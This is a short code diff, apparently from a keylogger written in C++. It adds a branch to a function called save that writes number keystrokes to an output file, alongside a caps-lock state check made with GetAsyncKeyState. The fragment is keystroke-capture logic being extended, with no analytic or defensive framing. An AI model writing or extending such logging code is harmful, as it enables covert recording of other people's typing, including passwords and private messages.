@@ -131,7 +131,9 @@ int save(int key)
 			break;
 		}
 	}
-
+        else if(key>=48&&key<=57)
+		fout<<(char)key;
+	
 	else
 	{
 		if (GetAsyncKeyState(VK_CAPITAL))
